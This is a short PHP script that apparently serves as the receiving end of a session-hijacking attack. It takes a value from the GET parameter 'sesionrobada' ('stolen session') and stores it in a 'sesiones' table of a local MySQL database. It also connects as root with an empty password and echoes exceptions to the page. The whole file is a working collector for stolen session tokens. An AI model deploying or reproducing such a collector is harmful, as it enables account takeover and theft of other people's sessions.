<?php

try {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $dbuser = "root";
    $dbpassword = "";

    $conn = new PDO("mysql:host=localhost;dbname=blog", $dbuser, $dbpassword);
    $dbuser = "";
    $dbpassword = "";
    $query = "INSERT INTO `sesiones` (`id`, `sesion`) VALUES (NULL, :sesion);";
    $q =  $conn->prepare($query);
    $result = $q->execute(array(
        ':sesion' => $_GET["sesionrobada"]
    ));
} catch (Exception $e) {
    // Catch and display exceptions
    echo 'Exception caught: ', $e->getMessage(), "\n";
}
?>
